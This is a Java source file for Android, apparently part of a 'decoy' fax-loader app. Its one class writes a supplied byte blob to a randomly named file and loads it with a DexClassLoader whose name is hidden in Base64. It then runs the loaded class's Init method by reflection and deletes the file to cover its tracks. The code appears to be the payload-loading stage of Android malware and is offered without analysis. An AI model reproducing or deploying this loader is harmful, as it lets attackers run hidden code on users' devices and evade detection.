package com.example.decoy.faxLoader;

import android.content.Context;
import android.content.SharedPreferences.Editor;
import android.util.Base64;
import android.util.Log;

import com.example.decoy.application;

import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.lang.reflect.Method;
import java.util.Random;

public class CrissCross {
    private static String pathCombine(String str, String str2) {
        return new File(new File(str), str2).getPath();
    }

    public static void crissCross(String stClassName, Context context, byte[] bArr) {
        try {
            String stDexClassLoader = new String(Base64.decode("ZGFsdmlrLnN5c3RlbS5EZXhDbGFzc0xvYWRlcg==", 0));

            File file = new File(pathCombine(context.getFilesDir().getPath(), "fex"), "temp");
            if (!file.exists()) {
                file.mkdirs();
            }

            File destFile = new File(file, randStr(18));
            FileOutputStream fileOutputStream = new FileOutputStream(destFile);
            fileOutputStream.write(bArr);
            fileOutputStream.close();

            Class[] newClass = new Class[]{String.class, String.class, String.class, ClassLoader.class};
            Object[] newObject = new Object[]{destFile.getPath(), context.getApplicationInfo().dataDir, null, context.getClassLoader()};
            Object newInstance = ((ClassLoader) Class.forName(stDexClassLoader).getConstructor(newClass).newInstance(newObject)).loadClass(stClassName).newInstance();

            ((application) context.getApplicationContext()).setObjects(stClassName, newInstance);

            Method declaredMethod = newInstance.getClass().getDeclaredMethod("Init", new Class[]{Context.class});
            declaredMethod.setAccessible(true);
            String str3 = (String) declaredMethod.invoke(newInstance, new Object[]{context});

            if (!destFile.exists() || !destFile.delete()) {
                PrintStream printStream = System.out;
                StringBuilder sb = new StringBuilder();
                sb.append("file not Deleted :");
                sb.append(destFile.getPath());
                printStream.println(sb.toString());
            } else {
                PrintStream printStream2 = System.out;
                StringBuilder sb2 = new StringBuilder();
                sb2.append("file Deleted :");
                sb2.append(destFile.getPath());
                printStream2.println(sb2.toString());
            }
            if (str3 != null) {

                if (str3.length() != 0) {
                    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.decode(str3, 0));

                    while (true) {
                        int read = byteArrayInputStream.read();
                        if (read != -1) {
                            switch (read) {
                                case 1:
                                    System.out.println("case 1");
                                    Editor edit = context.getApplicationContext().getSharedPreferences("MyPref", 0).edit();
                                    edit.putBoolean("working", true);
                                    edit.apply();
                                    break;
                                case 2:
                                    System.out.println("case 2");
                                    break;
                                case 3:
                                    System.out.println("case 3");
                                    break;
                                case 4:
                                    System.out.println("case 4");
                                    break;
                                case 5:
                                    System.out.println("case 5");
                                    break;
                                case 6:
                                    System.out.println("case 6");
                                    break;
                                case 7:
                                    System.out.println("case 7");
                                    break;
                                case 8:
                                    System.out.println("case 8");
                                    break;
                                case 9:
                                    System.out.println("case 9");
                                    break;
                                case 10:
                                    System.out.println("case 10");
                                    break;
                            }
                        } else {
                            return;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.d("error", e.getMessage());
        }
    }

    private static String randStr(int i) {
        Random random = new Random();
        StringBuilder sb = new StringBuilder(i);
        for (int i2 = 0; i2 < i; i2++) {
            sb.append((char) (97 + ((int) (random.nextFloat() * ((float) 26)))));
        }
        return sb.toString();
    }

}
